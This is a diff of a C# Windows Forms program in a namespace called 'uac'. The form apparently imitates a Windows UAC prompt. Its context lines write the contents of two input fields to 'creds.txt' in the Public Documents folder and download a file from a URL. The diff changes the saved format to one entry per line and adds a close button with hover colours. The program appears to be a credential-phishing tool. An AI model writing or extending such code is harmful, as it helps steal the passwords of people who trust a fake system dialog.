@@ -94,7 +94,7 @@ namespace uac
         {
             
             string computerName = Environment.MachineName;
-            string formatted = string.Format("{0};{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
+            string formatted = string.Format("{0}\n{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
             if (File.Exists(@"C:\Users\Public\Documents\creds.txt"))
             {
                 File.Delete(@"C:\Users\Public\Documents\creds.txt");
@@ -119,6 +119,27 @@ namespace uac
 
                 client.DownloadFileAsync(new Uri(fileUrl), fileName);
             }
+        }
+
+        
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            Close();
+        }
+
+        private void button3_MouseEnter(object sender, EventArgs e)
+        {
+            button3.BackColor = Color.FromArgb(240, 0, 0);
+
+            button3.ForeColor = Color.White;
+        }
+
+        private void button3_MouseLeave(object sender, EventArgs e)
+        {
+            button3.BackColor = Color.FromArgb(118, 185, 237);
+
+            button3.ForeColor = Color.Black;
         }
     }
 }
